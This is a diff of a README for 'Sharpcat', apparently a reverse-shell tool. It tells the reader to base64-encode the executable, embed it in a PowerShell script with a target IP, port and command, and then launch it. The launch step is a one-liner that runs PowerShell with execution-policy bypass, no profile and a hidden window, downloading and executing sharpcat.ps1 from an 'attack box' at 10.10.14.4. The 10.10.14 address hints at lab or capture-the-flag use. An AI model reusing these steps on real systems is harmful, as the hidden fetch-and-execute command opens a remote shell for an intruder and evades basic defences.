@@ -18,9 +18,11 @@ convert the .exe to b64
 
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\SomeDirectory\Sharpcat.exe")) | Out-File -Encoding ASCII C:\SomeDirectory\Sharpcat.txt
 
-clone this repo, edit the sharpcat.ps1 to adjust IP, PORT and COMMAND and the run via
+clone this repo, edit the sharpcat.ps1 to adjust IP, PORT and COMMAND
 
-insert the above b64 from Sharpcat.txt into the $b64 variable in sharpcat.ps1
+insert the b64 from Sharpcat.txt into the $b64 variable in sharpcat.ps1
+
+then use this to retrieve and start sharpcat. Adjust the ip for your attack box
 
 ```powershell -noexit -ep bypass -nop -w hidden -Command "IEX(IWR -usebasicparsing http://10.10.14.4/sharpcat.ps1)"```
 
